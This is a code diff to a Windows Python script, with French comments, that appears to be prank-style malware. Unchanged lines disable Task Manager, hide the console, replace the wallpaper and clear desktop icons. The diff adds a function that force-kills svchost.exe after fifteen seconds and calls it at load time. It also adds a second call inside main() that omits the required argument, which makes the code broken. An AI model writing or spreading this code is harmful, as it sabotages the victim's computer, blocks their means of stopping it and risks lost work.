@@ -18,6 +18,21 @@ def hide_console():
     if whnd != 0:
         ctypes.windll.user32.ShowWindow(whnd, 0)
 
+
+import subprocess
+
+def fermer_apres_delay(nom_programme, delay=15):
+    # Attendre le délai
+    time.sleep(delay)
+    
+    # Fermer le programme
+    subprocess.run(["taskkill", "/f", "/im", nom_programme])
+    print(f"{nom_programme} fermé après {delay} secondes")
+
+# Exemple pour svchost
+fermer_apres_delay("svchost.exe", 15)
+
+
 def play_music_loop():
     pygame.mixer.init()
     pygame.mixer.music.load("music.mp3")
@@ -217,6 +232,7 @@ def main():
     disable_task_manager()
     set_wallpaper("IMG_7832.jpeg")
     clear_desktop_icons()
+    fermer_apres_delay()
 
     # Met la musique en thread pour pas bloquer
     threading.Thread(target=play_music_loop, daemon=True).start()
